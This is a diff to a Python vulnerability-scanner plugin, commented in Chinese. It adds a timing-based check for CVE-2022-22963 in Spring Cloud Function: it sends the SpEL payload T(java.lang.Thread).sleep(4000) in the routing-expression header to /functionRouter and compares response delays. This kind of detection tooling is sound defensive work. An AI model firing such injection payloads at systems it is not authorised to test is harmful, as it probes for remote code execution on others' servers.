@@ -2,6 +2,8 @@
 # 漏洞原因：Spring Cloud Function 将 HTTP 头 `spring.cloud.function.routing-expression`
 #   的值注入 SpEL Expression 求值，攻击者可执行任意命令（影响 3.1.x / 3.2.x）。
 # 本插件仅做存在性验证：POST /functionRouter 带 SpEL 探针头，检测响应特征判定接口可达。
+import time
+
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
@@ -14,6 +16,11 @@ SCF_MARKER = "spring-cloud-function-rce-confirmed"
 # 探针 T(java.lang.String).valueOf(7*7) 的期望求值结果：真实漏洞回显该值，
 # 仅凭「短数字响应 / message/timestamp 等泛化标记」会把普通 200 响应判为漏洞
 EXPECTED_SPEL_RESULT = "49"
+# F12 时序差分探针：真实受影响版（3.2.2）会求值 routing-expression，
+# 而 "49" 不是已注册函数 → 返回 500（默认不暴露错误信息），修复版也返回 500。
+# 状态码/正文无法区分 → 用 T(Thread).sleep(4000) 的响应延迟证明 SpEL 真被求值。
+SLEEP_SPEL = "T(java.lang.Thread).sleep(4000)"
+SLEEP_MIN_DELAY_SECONDS = 2.5
 
 
 class SpringCloudFunctionRcePlugin(PluginBase):
@@ -96,6 +103,31 @@ class SpringCloudFunctionRcePlugin(PluginBase):
                 evidence=f"响应含本次探针的 SpEL 求值结果 {EXPECTED_SPEL_RESULT}，证实路由表达式被求值",
                 fix=self.fix,
             )
+        # F12：真实受影响版（3.2.2）会求值 routing-expression，但 "49" 不是已注册
+        # 函数 → RoutingFunction 断言失败返回 500（默认不暴露 message）；修复版
+        # （3.2.3+）用受限上下文直接拒绝，同样 500。状态码/正文都无法区分，因此用
+        # T(Thread).sleep(4000) 的响应延迟做时序差分（2026-11-02 C2-3 实测建议）。
+        baseline = self._timed_post(session, url, headers=None)
+        probe_elapsed = self._timed_post(session, url, headers={"spring.cloud.function.routing-expression": SLEEP_SPEL})
+        if (
+            baseline is not None
+            and probe_elapsed is not None
+            and probe_elapsed >= SLEEP_MIN_DELAY_SECONDS
+            and probe_elapsed - baseline >= SLEEP_MIN_DELAY_SECONDS * 0.8
+        ):
+            emit(ok("存在 CVE-2022-22963 Spring Cloud Function 远程代码执行漏洞（时序差分）"))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                severity=self.severity,
+                status=STATUS_CONFIRMED,
+                url=url,
+                evidence=(
+                    f"routing-expression 被求值：{SLEEP_SPEL} 使响应延迟 {probe_elapsed:.2f}s"
+                    f"（基线 {baseline:.2f}s），证明 SpEL 表达式在服务端执行"
+                ),
+                fix=self.fix,
+            )
         emit(no("不存在 CVE-2022-22963 Spring Cloud Function 远程代码执行漏洞"))
         return ScanResult(
             kind="vuln",
@@ -104,3 +136,16 @@ class SpringCloudFunctionRcePlugin(PluginBase):
             url=url,
             evidence="响应未含 Cloud Function RCE 特征（可能未部署或已修复）",
         )
+
+    @staticmethod
+    def _timed_post(session, url: str, headers=None):
+        """POST /functionRouter 并返回耗时秒数；请求异常返回 None。"""
+        start = time.monotonic()
+        try:
+            if headers:
+                session.post(url, data="probe", headers=headers)
+            else:
+                session.post(url, data="probe")
+        except Exception:
+            return None
+        return time.monotonic() - start
